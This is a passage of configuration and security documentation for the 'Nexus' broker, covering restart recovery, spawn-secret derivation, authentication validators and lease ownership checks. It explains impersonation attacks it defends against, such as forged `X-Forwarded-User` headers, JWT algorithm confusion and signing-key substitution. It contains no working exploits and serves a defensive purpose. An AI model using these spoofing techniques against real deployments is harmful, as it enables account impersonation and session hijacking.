the lease journal is compacted down to live leases, and the session → binary
index is keyed by session id — precisely the thing an A2A client does not know.

**Format.** Append-only JSONL, one object per line: `owner_id` (the principal;
omitted for the anonymous owner every caller is when no `auth:` block is
configured), `profile`, `context_id`, `session_id` and `at`. A later line for the
same `(owner_id, profile, context_id)` triple supersedes an earlier one. **No
secret is ever written**, for the same reasons as the lease journal.

**The key is the triple, not the `contextId`.** A2A lets a client choose its own
`contextId` ([§3.4](https://a2a-protocol.org)), so keying on it alone would let
any caller name another caller's conversation and be handed that session's
history. A colliding `contextId` under a different principal — or a different
profile — resolves to the caller's **own** binding: no leak, no oracle, and no
overwrite of the real owner's entry.

**When a line is written.** On the instance's **session-id report**, which is the
earliest moment the session id exists. An empty `session_id` is never written:
empty means *not recorded*. Re-recording an unchanged pairing does not append, so
a conversation resumed many times costs one line.

**Growth is bounded** by an entry cap of **4096 bindings**, applied when the file
is rewritten — on open and every 256 appends — via a temp file and an atomic
rename. The number matches the session → binary index deliberately: the two are
populated by the same events at the same rate (one A2A conversation is one engine
session), so a broker that outgrows one has outgrown both. When the cap is
exceeded the **oldest** bindings are dropped, ordered by when each was last
recorded.

> **Eviction is lossy, by design, and nothing warns anybody.** A pruned binding
> reads back as *unknown*, and unknown means "new conversation": the next message
> on that `contextId` spawns a **fresh session** and the client is told nothing —
> it simply finds the agent has forgotten the conversation. That is the accepted
> cost of a key space with no retirement event; nothing ever marks a conversation
> as finished, because being resumable later is the whole point of one. The cap is
> generous for that reason, and the degradation is always to *forgetting*, never
> to answering with the **wrong** session. A deployment that needs a conversation
> to survive indefinitely should not rely on this file: keep the engine session id
> the broker reported and address it directly.

**Failure handling.** Malformed, torn or partially-written lines are **skipped
with a warning** and every good line before them is kept; the rewrite-on-open
truncates the damage away. An index that cannot be opened at all is **not** a boot
failure — it logs a `WARN` and continuity falls back to the life of the process,
because refusing to serve would trade resumability for an outage. A write that
fails is logged and never fails the message that produced it; the cost is that a
later resume starts fresh.

**With no `state_dir` there is no index at all.** A conversation is then resumable
only for as long as its lease lives — the same bargain such a broker has already
made for its leases.

### Restart recovery (`reattach_window`)

With `state_dir` set, a restarting broker **reclaims the instances it left
running** instead of orphaning them. Recovery runs at boot, before any route is
served, because a surviving instance is already retrying its dial-back and every
attempt made before its lease is back in the registry is refused as unknown.

For each live record in the journal, exactly one thing happens:

| Record state | Outcome |
|---|---|
| `broker_id` is not this broker's | **Left alone.** Not adopted, not killed, not closed out — the broker has no standing over a lease it cannot identify as its own. `state_dir` is per-broker, so this only happens if `broker_id` changed under a directory. |
| No `pid` | **Closed out** (`lease-released`, reason `restart recovery: no process was ever spawned`). The broker died between minting the lease and exec'ing its instance. |
| `pid` is not alive | **Closed out** (reason `restart recovery: process is gone`). |
| `pid` is alive | **Restored**: the lease comes back with its original `owner`, `session_id`, `pid` and `created_at`, and **re-holds its capacity slot** so `max_concurrent` stays honest and the broker cannot over-admit. |

A restored lease is **inactive** — it reads as `spawning` on `GET /leases` — until
an instance dials `/instance` and presents both the correct lease id **and** the
correct spawn secret. Once it does, the lease is fully ordinary: idle sweeping,
crash watching, ownership checks and `POST /release` all apply unchanged.

**Liveness is not identity**, which is why a restored lease is not handed to
whoever dials in naming it: the pid recorded before the restart may have been
recycled to an unrelated process, and a signal-0 probe (the portable check on
Linux and macOS) cannot see the difference. Admitting a dialer on a lease id alone
would hand a stranger's process a client's session. The spawn secret settles it,
and it is required on **every** registration — restored or not, `auth:` block or
not (see [Instance dial-back authentication](#instance-dial-back-authentication-ws-instance)).

**How the secret survives when it is never written down.** The per-spawn secret
is **derived**, not stored: `HMAC-SHA256(<state_dir>/spawn-key, lease_id)`. The
key file is 32 random bytes, generated on first boot, mode `0600` inside the
`0700` `state_dir`. What is on disk is a *key*, not a credential — its contents
authenticate nothing on their own, it is not addressed to any lease, and the
journal beside it still contains no secret. The trade-off is explicit: anyone who
can read `spawn-key` **and** knows a live lease id can impersonate that lease's
instance — but that reader is already running as the broker's uid, and can
therefore read the secret out of the child's environment or spawn instances
directly. **Losing or rotating the key is safe, just lossy**: derived secrets stop
matching, restored leases fail to reattach, and the reaper kills their instances
and frees their slots. The broker logs a `WARN` if the key file is unreadable as a
key (it regenerates one) or is readable beyond its owner.

**Nothing reattaches forever.** A restored lease that no instance registers
against within `reattach_window` is reaped through the same teardown as a manual
release, so the shutdown → grace → force-kill sequence and the slot accounting
stay in one place. Because a reaped lease has no dial-back socket to receive the
protocol shutdown frame on, its process is signalled `SIGTERM` (which the engine
handles as a clean shutdown that persists the session) and escalated to `SIGKILL`
if it does not exit.

**Boot is never failed by recovery.** An empty, absent, unreadable or corrupt
journal is a clean cold start with a `WARN`. (A `state_dir` that cannot be *opened*
at all is still fatal — that is a misconfiguration, not lost data.) With
`state_dir` unset, boot is byte-for-byte what it was before recovery existed.

### Authentication (`auth:`)

The `auth:` block configures an ordered chain of credential validators
(`pkg/nexusauth`). Five routes are authenticated by middleware — `POST /claim`,
`POST /release/{lease_id}`, `GET /leases`, `POST /ticket/{lease_id}`, and
`GET /binaries`.
`GET /healthz` is registered **outside** the guard and always answers `200` with
no credential, because a load balancer or container probe has none to present.

`WS /lease/{lease_id}`, the per-lease client socket, is not behind that
middleware but **does** use the same validator chain: it resolves the caller's
credential itself and then enforces lease ownership before the WebSocket upgrade
— see [Lease ownership](#lease-ownership) below. It stays off the middleware
because it accepts **either** an `Authorization: Bearer` header **or** a
single-use `?ticket=` query parameter, and a bearer-header wrapper cannot express
the second. See [`WS /lease/{lease_id}`](#ws-leaselease_id-http-api-not-yaml) for
the two credentials and their precedence. The `WS /instance` dial-back is **not**
covered by this block at all: it authenticates with a spawn secret.

```yaml
auth:
  admin_scope: "nexus.broker.admin"   # optional; "" means nobody is an operator
  validators:          # ordered; the first validator that accepts wins
    - type: static
      tokens:
        - token: "..."          # bearer token, compared in constant time
          principal: "ci-runner"  # required: the identity this token acts as
          tenant: "acme"          # optional
          scopes: "a b"           # optional: string (space/comma separated) or list
    - type: jwks            # OIDC JWTs verified against the issuer's published keys
      issuer: "https://id.example.com/"
      jwks_url: "https://id.example.com/.well-known/jwks.json"
      audience: "nexus-broker"
      algorithms: ["RS256"]
      principal_claim: sub
    - type: introspect      # opaque tokens verified by asking the issuer (RFC 7662)
      introspection_url: "https://id.example.com/oauth2/introspect"
      client_id: "nexus-broker"
      client_secret_env: "NEXUS_BROKER_INTROSPECTION_SECRET"
      principal_claim: sub
    - type: proxy_headers   # identity established by a fronting authenticating proxy
      trusted_proxy_cidrs: ["10.4.0.0/16"]   # required, and the entire security model
      principal_header: X-Forwarded-User
```

| Key                                    | Type            | Default    | Description                                                                                     |
|----------------------------------------|-----------------|------------|-------------------------------------------------------------------------------------------------|
| `auth.admin_scope`                     | string          | `nexus.broker.admin` | The scope a validated credential must carry to be treated as a broker **operator**. It widens `GET /leases` from "the caller's own leases" to the whole registry plus the capacity aggregates — and **nothing else**: `POST /release/{lease_id}` and `WS /lease/{lease_id}` stay strict principal-`ID` ownership, so a leaked operator credential cannot tear down or hijack another principal's session. Comparison is exact and case-sensitive. Set it to `""` (or `admin_scope:` with no value) to mean **no caller is an operator**, which makes `GET /leases` caller-scoped for everybody. Irrelevant while auth is disabled — the endpoint is then unrestricted for all callers. |
| `auth.validators`                      | list            | `[]`       | Validators to try, **in order**; the first one that accepts the request wins, so cheap validators belong first. An empty or absent list means auth is disabled. Unknown keys are rejected at every level. |
| `auth.validators[].type`               | string          | *required* | Validator implementation: `static` (a table of shared tokens), `jwks` (OIDC JWTs verified against an issuer's published key set), `introspect` (opaque tokens verified by calling the issuer's RFC 7662 introspection endpoint), or `proxy_headers` (an identity a fronting authenticating proxy already established, honoured only for peers inside a CIDR allowlist). |
| `auth.validators[].principal_claim`    | string          | `""`       | Which claim becomes `Principal.ID`. Parsed for every entry; **required for `jwks` and `introspect`**, accepted and ignored by `static` and `proxy_headers` (neither has a claim set — `proxy_headers` uses `principal_header` instead). |
| `auth.validators[].tenant_claim`       | string          | `""`       | Which claim becomes `Principal.Tenant`. Optional for `jwks` and `introspect`; accepted and ignored by `static` and `proxy_headers`. |
| `auth.validators[].scopes_claim`       | string          | `""`       | Which claim becomes `Principal.Scopes`. Optional for `jwks` and `introspect`; accepted and ignored by `static` and `proxy_headers`. |
| `auth.validators[].tokens`             | list            | *required for `static`* | Token table for a `static` validator. At least one entry; duplicate `token` values are a config error rather than a last-one-wins surprise. |
| `auth.validators[].tokens[].token`     | string          | *required* | The bearer token value, matched against `Authorization: Bearer <token>` with a constant-time compare. |
| `auth.validators[].tokens[].principal` | string          | *required* | The principal id a request presenting this token acts as. Must be non-empty — an empty principal would behave as a wildcard in later ownership checks. |
| `auth.validators[].tokens[].tenant`    | string          | `""`       | Optional tenant/workspace id carried on the principal. |
| `auth.validators[].tokens[].scopes`    | string or list  | `[]`       | Optional granted scopes. A string is split on whitespace (`"a b"` → `["a","b"]`); a list is taken verbatim. Scope comparison is case-sensitive. |

Because `static` tokens are written inline, a `broker.yaml` carrying them is a
secret: restrict its file permissions accordingly.

#### The `jwks` validator

`type: jwks` verifies an RFC 7515 JWS bearer token against the signature keys an
OIDC issuer publishes at its JWKS endpoint, validates `exp` / `nbf` / `iss` /
`aud`, and maps the verified claims onto the `Principal`. Signature and
standard-claim verification use `github.com/golang-jwt/jwt/v5`; the key fetch,
cache and rotation logic is Nexus's own.

It is **generic OIDC with no provider-specific defaults**. Nexus does not know
which claim your issuer puts a stable subject in, so `principal_claim` is
required and there is no fallback guess — a validator that silently defaulted to
`sub` for an issuer that mints a different stable identifier would bind lease
ownership to the wrong field.

```yaml
auth:
  admin_scope: "nexus.broker.admin"
  validators:
    - type: jwks
      # Required. Compared exactly against the token's `iss` claim.
      issuer: "https://id.example.com/"

      # Required. The issuer's key set endpoint. Must be https, except to a
      # loopback host. There is no OIDC discovery — see below.
      jwks_url: "https://id.example.com/.well-known/jwks.json"

      # Required. A token matching any listed audience passes.
      audience: "nexus-broker"
      # …or several:
      # audience: ["nexus-broker", "nexus-broker-staging"]

      # Optional. Asymmetric algorithms only.
      algorithms: ["RS256"]

      # Claim mapping. principal_claim is required.
      principal_claim: sub
      tenant_claim: org_id
      scopes_claim: scope

      # Optional cache and transport tuning.
      cache_ttl: 10m
      negative_cache_ttl: 1m
      http_timeout: 5s
      clock_skew: 1m
```

| Key                                          | Type           | Default    | Description |
|----------------------------------------------|----------------|------------|-------------|
| `auth.validators[].issuer`                   | string         | *required* | The exact value the token's `iss` claim must carry. A token with no `iss`, or a different one, is rejected. Compared as an opaque string, not as a URL, so it matches whatever your issuer actually mints — trailing slash included. |
| `auth.validators[].jwks_url`                 | string         | *required* | The issuer's JWKS endpoint. Must be an absolute `https://` URL; plain `http://` is accepted **only** for a loopback host (`127.0.0.1`, `::1`, `localhost`), for local development and sidecar-fronted deployments. The key set is the entire basis for trusting a token, so fetching it over a rewritable channel would let an on-path attacker substitute a signing key and mint any principal. Userinfo in the URL is rejected. Validated at load, so a typo fails the boot, not the first claim. |
| `auth.validators[].audience`                 | string or list | *required* | Acceptable `aud` values; a token carrying **any** of them passes. A lone string is one audience and is **not** split on whitespace (unlike `scopes`), because an audience is a single opaque identifier and splitting would silently widen what the broker accepts. A token with **no** `aud` is rejected. |
| `auth.validators[].algorithms`               | list           | `["RS256"]` | The JWS algorithms accepted **at verification time**. The token header's `alg` is never trusted: it is checked against this list before any key is resolved, and again by the JWT library. Allowed values are `RS256`/`RS384`/`RS512`, `PS256`/`PS384`/`PS512`, `ES256`/`ES384`/`ES512`. `none` and the HMAC family (`HS256`/`HS384`/`HS512`) are **not configurable at all** — allowing a symmetric algorithm against a published key set *is* the algorithm-confusion attack, so it is a config error rather than a footgun. |
| `auth.validators[].cache_ttl`                | duration       | `10m`      | How long a fetched key set is considered fresh. A `kid` already in the cache is always served from memory with **no network round trip** — verification sits on `POST /claim` and on the WebSocket connect path, so a per-request fetch would put the issuer's latency in front of every session. Past the TTL the request is *still* served from cache and a refresh runs behind it. `0` means the default. |
| `auth.validators[].negative_cache_ttl`       | duration       | `1m`       | How long a `kid` that could not be resolved is remembered as unresolvable, **and** the minimum interval between on-demand key-set fetches. Both bounds matter: the per-`kid` half stops a repeated forged token from re-fetching, and the global half stops a flood of tokens bearing *distinct* invented `kid`s from amplifying one-to-one into issuer traffic. It is also the recovery interval — a genuine key rotation that arrives during the window is picked up when it expires, with no restart. `0` means the default. |
| `auth.validators[].http_timeout`             | duration       | `5s`       | Bounds a single JWKS request, and is the worst-case latency an unreachable issuer can add to a **cold** claim. A hanging identity provider cannot hang a claim. `0` means the default. |
| `auth.validators[].clock_skew`               | duration       | `1m`       | Leeway applied to `exp` and `nbf`, absorbing clock drift between the issuer and the broker. Capped at `5m`: a large skew silently extends the life of every token the issuer ever minted, so a mistyped value fails the boot. Set `clock_skew: 0s` for no leeway at all. |

Durations are Go duration strings (`10m`, `30s`, `1h30m`). A bare number is a
config error — `600` reads as ten minutes to a human and six hundred nanoseconds
to Go, and guessing either would be worse than saying so.

**Key rotation and JWKS failures.** A `kid` the cache has not seen triggers one
synchronous fetch, which is what makes rotation work without a restart: a token
signed with a key added to the JWKS *after* the cache was populated verifies on
its first presentation. When the endpoint is unreachable, behaviour is
deliberately asymmetric — a key already in the cache **keeps verifying** (that is
the point of the cache), but a `kid` that is *not* cached is **denied**. An
endpoint the broker cannot reach cannot vouch for a key it does not hold, so the
failure mode is a refusal and never an allow.

**Claim mapping.** `principal_claim` → `Principal.ID`, `tenant_claim` →
`Principal.Tenant`, `scopes_claim` → `Principal.Scopes`. The scopes claim accepts
either a space-delimited string (the OAuth 2.0 `scope` convention) or a JSON
array of strings. The full verified claim set is carried on the principal for
audit regardless of which claims are mapped. A token whose `principal_claim` is
**absent, empty, or not a scalar is rejected**: an empty `Principal.ID` would
compare equal to the anonymous owner and to every other empty-id principal, which
is a privilege-escalation path rather than a cosmetic gap.

**Two further rejections worth knowing about.** A token with no `exp` is rejected
rather than treated as valid forever. And when the issuer publishes an `alg` on a
key (RFC 7517 §4.4), that declaration is enforced: a key published for `RS256`
will not verify an `RS512` token even if both algorithms are in your
`algorithms` list.

**No OIDC discovery — `jwks_url` is explicit, by decision.**
`/.well-known/openid-configuration` is deliberately not supported. Three reasons:
a discovery document can point the JWKS URL anywhere, so supporting it adds a
second endpoint whose compromise substitutes signing keys; an explicit URL is one
host to allow through an egress firewall instead of two; and it removes a
network dependency from the first claim after startup. To configure a provider
that documents only its discovery URL, fetch that document once by hand and copy
its `jwks_uri` value:

```bash
curl -s https://id.example.com/.well-known/openid-configuration | jq -r .jwks_uri
```

If your issuer ever changes that URL you will need to update `broker.yaml`, which
is the trade being made: an explicit, auditable endpoint over an automatically
followed one.

#### The `introspect` validator

`type: introspect` verifies an **opaque** bearer token by asking the issuer about
it, per [RFC 7662](https://www.rfc-editor.org/rfc/rfc7662) (OAuth 2.0 Token
Introspection). Not every identity provider issues JWTs; a token that carries no
claims and no signature can only be validated by the authority that minted it.
The broker POSTs the token to the configured introspection endpoint using its
own client credentials, reads the `active` verdict plus the returned claims, and
maps those claims onto the `Principal` using the **same** `principal_claim` /
`tenant_claim` / `scopes_claim` options as `jwks`.

```yaml
auth:
  validators:
    - type: introspect
      # Required. The issuer's RFC 7662 endpoint. Same transport rule as
      # jwks_url: https, or http to a loopback host.
      introspection_url: "https://id.example.com/oauth2/introspect"

      # Required. How the broker identifies itself to that endpoint.
      client_id: "nexus-broker"

      # The broker's own secret. Give it inline OR by env-var reference,
      # never both.
      client_secret_env: "NEXUS_BROKER_INTROSPECTION_SECRET"
      # client_secret: "..."

      # Optional.
      client_auth: basic          # basic (default) | post
      token_type_hint: access_token

      # Claim mapping. principal_claim is required.
      principal_claim: sub
      tenant_claim: org_id
      scopes_claim: scope

      # Optional cache and transport tuning.
      cache_ttl: 1m
      negative_cache_ttl: 30s
      http_timeout: 5s
```

| Key                                          | Type           | Default        | Description |
|----------------------------------------------|----------------|----------------|-------------|
| `auth.validators[].introspection_url`        | string         | *required*     | The RFC 7662 introspection endpoint. Must be an absolute `https://` URL; plain `http://` is accepted **only** for a loopback host (`127.0.0.1`, `::1`, `localhost`), for local development and sidecar-fronted deployments — the endpoint decides who every caller is, so a rewritable channel would let an on-path attacker mint any principal. Userinfo in the URL is rejected. Validated at load, so a typo fails the boot, not the first claim. |
| `auth.validators[].client_id`                | string         | *required*     | The client id the broker presents to the introspection endpoint. RFC 7662 §2.1 requires the endpoint to authorize its callers, so this is required rather than optional — an operator should not discover it from the endpoint's own `401`. |
| `auth.validators[].client_secret`            | string         | `""`           | The broker's client secret, written inline. Mutually exclusive with `client_secret_env`. A `broker.yaml` carrying one is a secret file — restrict its permissions. |
| `auth.validators[].client_secret_env`        | string         | `""`           | The **name** of an environment variable holding the client secret, so it need not be inlined in `broker.yaml`. Setting both this and `client_secret` is a config error rather than a precedence puzzle. A named variable that is unset or empty **fails the boot**: falling back to an empty secret would authenticate the broker as an anonymous client and surface much later as a confusing `401` from the endpoint. The value is trimmed (a secret injected from a file routinely arrives with a trailing newline) and is never logged — errors name the variable, never its value. |
| `auth.validators[].client_auth`              | string         | `basic`        | How the client credentials are presented: `basic` (HTTP Basic, RFC 6749 §2.3.1 — every authorization server must support it, and it keeps the secret out of the request body) or `post` (`client_id`/`client_secret` as form parameters, for providers that only accept `client_secret_post`). With `basic` the id and secret are form-urlencoded before base64, as RFC 6749 requires, so a secret containing `:` or a non-ASCII byte is presented correctly. |
| `auth.validators[].token_type_hint`          | string         | `access_token` | The optional RFC 7662 §2.1 `token_type_hint` parameter. Set it to `""` to send no hint at all. |
| `auth.validators[].cache_ttl`                | duration       | `1m`           | The **maximum** lifetime of a cached verdict. A cache hit costs **no network round trip** — this validator sits on `POST /claim` and on the WebSocket connect path, so a per-request round trip would put the issuer's latency in front of every session. The effective TTL is the **lower** of this and the response's own `exp`, so a cache entry can never outlive the token it describes; a response with no `exp` falls back to this value and never to unbounded caching. Capped at `15m`: introspection exists precisely so a token can be revoked *before* it expires, and a longer cache would silently throw that away, so an over-long value fails the boot. `0` means the default. |
| `auth.validators[].negative_cache_ttl`       | duration       | `30s`          | How long a **definitive** refusal (`active: false`, or a response whose `principal_claim` is unusable) is remembered, so a client retrying a dead token in a loop does not become introspection traffic. An **unavailable** verdict — timeout, non-2xx, unparseable body — is deliberately **never** cached, so recovery from an issuer outage is immediate with no TTL to wait out. Same `15m` cap. `0` means the default. |
| `auth.validators[].http_timeout`             | duration       | `5s`           | Bounds a single introspection request, and is therefore the worst-case latency a hung identity provider can add to a **cold** claim — which matters more here than anywhere else, because `POST /claim` has its own ready-timeout budget to respect. `0` means the default. |

**Nothing but `active: true` is an allow.** `active: false` is a denial; so is a
non-2xx status, a body that is not a JSON object, a missing `active` member, and
an `active` member that is not a boolean. There is no path from a strange
response to an authenticated caller.

**A response whose `principal_claim` is absent, empty, or not a scalar is
rejected**, exactly as for `jwks`: an empty `Principal.ID` would compare equal to
the anonymous owner and to every other empty-id principal, which is a
privilege-escalation path rather than a cosmetic gap.

**Caching.** Verdicts are cached in memory keyed by the **SHA-256 of the token**,
never by the token itself — the cache is a long-lived map of live credentials, so
a heap dump or a debug print of its keys must not hand over working tokens. The
map is bounded (4096 entries); past that, expired entries are reclaimed first and
live ones are trimmed at random, since the worst case of evicting a live entry is
one extra round trip and never a wrong verdict. Concurrent lookups of the *same*
token collapse onto a single request, so a client opening several leases at once
does not multiply the round trip the cache exists to avoid.

**Secret sourcing convention.** `<key>` holds a literal value; `<key>_env` holds
the **name** of an environment variable to read it from. It is the same pair
`nexus.io.agui` uses for `bearer_token` / `bearer_token_env`, and any future
secret-bearing key follows it.

**Status mapping.** Denials are classified by the validator chain, not by string
matching, and map onto:

| Situation                                            | Status | Body                                              | Headers                                                     |
|------------------------------------------------------|--------|---------------------------------------------------|-------------------------------------------------------------|
| No `Authorization: Bearer` header                    | `401`  | `{"error":"authentication required"}`             | `WWW-Authenticate: Bearer realm="nexus-broker"`             |
| Credential presented and rejected                    | `401`  | `{"error":"credential rejected"}`                 | `WWW-Authenticate: Bearer realm="nexus-broker", error="invalid_token"` |
| Credential valid but lacking the required authority   | `403`  | `{"error":"insufficient scope"}`                  | `WWW-Authenticate: Bearer realm="nexus-broker", error="insufficient_scope"` |
| The validator could not reach a verdict               | `503`  | `{"error":"authentication temporarily unavailable"}` | `Retry-After: 5` (deliberately **no** `WWW-Authenticate`)  |

The `503` is what an `introspect` validator returns when the introspection
endpoint times out, refuses the broker's *own* client credentials, or answers
with a server error. None of those is a statement about the caller's token — RFC
7662 encodes "this token is no good" as `200` with `active: false`, never as an
error status — so reporting them as `401` would tell every client at once to
re-authenticate against an identity provider that is already failing. It is still
a refusal: no lease is claimed and nothing is released. A `503` also outranks a
plain rejection when several validators are chained: if a `static` table rejects
a token that `introspect` merely could not check, the honest answer is "ask
again", not "your credential is bad". The `jwks` validator does not produce this
status — its key cache absorbs an issuer outage for any key it already holds.

The client is told the *kind* of refusal but not which validator refused. The
full per-validator diagnosis goes to the log instead, since validator names are
deployment topology.

**Audit trail.** Every allow and every deny emits exactly one structured `slog`
record — `auth allowed` (INFO) or `auth denied` (WARN) — carrying `route` (the
matched mux pattern), `principal_id` (empty on a deny), `lease_id` when the route
has one in its path, and on a deny a `reason` plus the per-validator `denial`
group. There is no separate audit sink; these records are it.

#### The `proxy_headers` validator

`type: proxy_headers` trusts an identity that a fronting reverse proxy has
already established and passed down in request headers — oauth2-proxy, an
OIDC-aware ingress, an authenticating service-mesh sidecar. It makes the broker's
original deployment story ("put your own authenticating proxy in front of it")
first-class instead of a workaround.

> **⚠️ A wrong `trusted_proxy_cidrs` turns this validator into an open door.**
> A header is not a credential. Anyone who can open a TCP connection to the
> broker's `listen_addr` can send `X-Forwarded-User: <anybody>` — there is no
> signature, no expiry, and nothing to verify. The **only** thing standing
> between that and full impersonation is the CIDR allowlist, so:
>
> - **Never write `0.0.0.0/0` or `::/0`.** That is not "allow the ingress", it is
>   "let every caller on the network name themselves". A request from the public
>   internet carrying `X-Forwarded-User: admin@example.com` would then claim
>   leases, release other people's leases, and — with a matching
>   `auth.admin_scope` in its scopes header — read the whole lease registry.
> - **Write the proxy's own address, not the client's.** The allowlist is matched
>   against the peer that opened the connection, which is the proxy.
> - **Do not point it at a network you share with anything else.** A `10.0.0.0/8`
>   that also contains other tenants' workloads means any of those workloads can
>   impersonate any broker user. Use the proxy's `/32` (or `/128`) where you can.
> - **Bind the broker where only the proxy can reach it** — a loopback address or
>   a private interface — so the CIDR check is a second line of defence rather
>   than the only one.
> - Chain this validator with `static`, `jwks`, or `introspect` (below) if some
>   callers arrive directly rather than through the proxy; do **not** widen the
>   CIDR to accommodate them.

```yaml
auth:
  validators:
    - type: proxy_headers
      # Required, and non-empty. Headers are read ONLY when the connecting peer
      # is inside one of these networks. IPv4 and IPv6 alike.
      trusted_proxy_cidrs:
        - 10.4.0.0/16
        - fd00:1ce::/64

      # Required. No default: X-Forwarded-User, X-Auth-Request-Email and
      # X-Forwarded-Preferred-Username are all real conventions.
      principal_header: X-Forwarded-User

      # Optional.
      tenant_header: X-Auth-Request-Org
      scopes_header: X-Forwarded-Groups
```

| Key                                     | Type           | Default    | Description |
|-----------------------------------------|----------------|------------|-------------|
| `auth.validators[].trusted_proxy_cidrs`  | string or list | *required* | The networks whose peers may assert an identity through headers. A lone string is one CIDR (it is **not** split on whitespace). IPv4 and IPv6 prefixes are both accepted, and a prefix written with host bits set (`10.4.1.2/16`) is masked to the network it actually matches. **An empty or absent list is a boot failure, never an implicit allow-everything** — failing open here would silently turn the broker into an open door. A malformed entry fails the boot too, naming the index and the offending value. |
| `auth.validators[].principal_header`     | string         | *required* | The header whose value becomes `Principal.ID`. There is no default because no default is right for everyone. Header names are matched case-insensitively. |
| `auth.validators[].tenant_header`        | string         | `""`       | Optional header whose value becomes `Principal.Tenant`. Empty means the tenant is never populated. |
| `auth.validators[].scopes_header`        | string         | `""`       | Optional header whose value becomes `Principal.Scopes`, split on **commas and/or whitespace** so both the OAuth 2.0 space-delimited form (`"a b"`) and the comma-delimited lists proxies such as oauth2-proxy emit (`"a,b"`) work unchanged. RFC 6749's scope grammar allows neither character inside a scope, so nothing legitimate is split apart. Scope comparison stays case-sensitive. |

This validator has **no secret-bearing key**, and therefore no `_env` companion:
what authenticates a caller here is the network the connection came from, not a
value that has to be kept out of the config file.

**Only the real peer address is consulted. `X-Forwarded-For` is never read.**
`XFF` (and `X-Real-IP`, and anything like them) is written by whoever is talking
to the broker and can name any address at all; using it for the trust decision
would hand the allowlist straight to the attacker. The check uses the peer
address the kernel reports for the accepted connection and nothing else. A
`RemoteAddr` that is unset, malformed, or a Unix-socket path — which has no IP —
is **denied**, with no "probably local" fallback.

**Out-of-CIDR peers are reported as "no credential", not "credential rejected".**
From an untrusted peer the headers are not a credential that failed; they are not
a credential at all, because the validator never looks at them. That matters
twice over: a prober is not told its forged headers were even considered, and in
a chain the aggregate denial does not get upgraded to `401 credential rejected`
(with no challenge) for a caller that simply forgot its bearer token. See the
[status mapping](#the-introspect-validator) table above.

**A trusted peer whose `principal_header` is absent or blank is denied**, exactly
as for `jwks` and `introspect`: an empty `Principal.ID` would compare equal to
the anonymous owner and to every other empty-id principal, which is a
privilege-escalation path rather than a cosmetic gap.

**A header that arrives more than once is refused.** Several proxies *append*
their value to a header the caller already sent rather than replacing it, leaving
`X-Forwarded-User: attacker, real-user` as two values — of which the first, the
caller's, is the one a naive read returns. A correctly configured proxy always
sends exactly one value, so refusing the ambiguous case costs nothing and closes
an impersonation path.

`Principal.Claims` stays empty for this validator: proxy headers carry no claim
set, the same way a `static` token carries none.

Because the trust decision is positional rather than cryptographic, this
validator composes well with the others through the chain — proxy headers from
the ingress network, tokens from everywhere else:

```yaml
auth:
  validators:
    - type: proxy_headers          # tried first: no network round trip
      trusted_proxy_cidrs: ["10.4.0.0/16"]
      principal_header: X-Forwarded-User
    - type: jwks                   # direct callers still need a real token
      issuer: "https://id.example.com/"
      jwks_url: "https://id.example.com/.well-known/jwks.json"
      audience: "nexus-broker"
      principal_claim: sub
```

#### Lease ownership

Every lease records the principal that claimed it (stamped from the authenticated
`POST /claim` request). Four routes consult that ownership:

| Route                       | Enforcement                                                                                                                             |
|-----------------------------|-----------------------------------------------------------------------------------------------------------------------------------------|
| `POST /release/{lease_id}`  | The caller's principal `ID` must equal the lease owner's `ID`, checked **before** any teardown begins — a refused release sends no shutdown frame, kills nothing, and frees no slot. |
| `WS /lease/{lease_id}`      | The same check, applied after the credential is validated and **before** the WebSocket upgrade, so a refused caller never gets an open socket that is then closed. It applies to a redeemed `?ticket=` exactly as to a bearer token: a ticket is already bound to one lease *and* one principal, and ownership is re-checked on top of that so the lease must still exist and still belong to that principal at **connect** time, not merely at mint time. |
| `POST /ticket/{lease_id}`   | The same check, applied **before** any ticket is minted — a refused caller is issued nothing. See [`POST /ticket/{lease_id}`](#post-ticketlease_id-http-api-not-yaml). |
| `GET /leases`               | Not a refusal but a **filter**: the listing contains only leases whose owner `ID` matches the caller's, and the capacity aggregates are omitted. A caller holding `auth.admin_scope` gets the whole registry instead. See [`GET /leases`](#get-leases-http-api-not-yaml). |

Comparison is principal-`ID` equality and nothing else; `tenant` is never
consulted, and `scopes` only via `auth.admin_scope` on the read-only listing —
the two mutating routes ignore scopes entirely.

**An unknown lease and another principal's lease answer identically** — same
status, same body — so live lease ids cannot be enumerated by differencing
responses:

| Route                      | Unknown *or* unowned lease                                          |
|----------------------------|---------------------------------------------------------------------|
| `POST /release/{lease_id}` | `404` `{"error":"unknown lease"}`                                    |
| `POST /ticket/{lease_id}`  | `404` `{"error":"unknown lease"}` — byte-identical to the release refusal |
| `WS /lease/{lease_id}`     | `404` `unknown lease` (plain text; the handshake never reaches `101`) |

A credential that fails validation on `WS /lease/{lease_id}` gets the usual
`401`/`403` from the status table above — a rejected `?ticket=` included, with the
`credential rejected` body. That branch never consults the registry, so it reveals
nothing about whether the lease exists, and every way a ticket can fail answers
identically; see
[`WS /lease/{lease_id}`](#ws-leaselease_id-http-api-not-yaml).

Each ownership refusal emits one `lease access denied` WARN record carrying
`route`, `principal_id` and `lease_id`. Like the response, it does not record
whether the lease existed.

**With the `auth:` block absent, nothing is refused and nothing is filtered.** The
lease owner and the caller are then both the anonymous identity, so the equality
check admits every caller and all three routes behave exactly as they did before
ownership existed — `GET /leases` included, aggregates and all.

The broker's **own** teardown paths — the `idle_timeout` sweeper and crash
detection — bypass ownership entirely. They are the broker acting on itself with
no principal at all, which is why the check lives in the HTTP handlers rather
than in the shared teardown they funnel through.

The spawned-instance side is configured by the `nexus.io.broker` plugin
(`broker_addr`, `lease_id`, `spawn_secret`) — see
[`nexus.io.broker`](#nexusiobroker) in the I/O section. All three keys fall back
to the `NEXUS_BROKER_ADDR` / `NEXUS_BROKER_LEASE_ID` /
`NEXUS_BROKER_SPAWN_SECRET` environment variables the broker injects at spawn
(defined as `brokerframe.EnvBrokerAddr` / `brokerframe.EnvLeaseID` /
`brokerframe.EnvSpawnSecret`).

#### Instance dial-back authentication (`WS /instance`)

The `auth:` block does **not** govern the instance dial-back. That block says how
*clients* are verified; `WS /instance` is where a process the broker started
proves it is that process, and it does so with the per-spawn secret the broker
minted for the lease (injected through the child's environment at exec, never
argv).

**The secret is required unconditionally** — `auth:` block or not, claimed lease
or restored lease. The register frame must carry a known `lease_id`, a `version`
matching the broker's own frame schema version, and the matching secret.

> **Breaking change.** Enforcement used to be gated on the `auth:` block being
> present, so an unauthenticated broker (the documented default) admitted any
> register frame naming a live lease — including one carrying no secret at all.
> Lease ids are not secret: they travel in `ws_url`s, client requests and logs, so
> anything that observed one could register as that lease's instance the moment
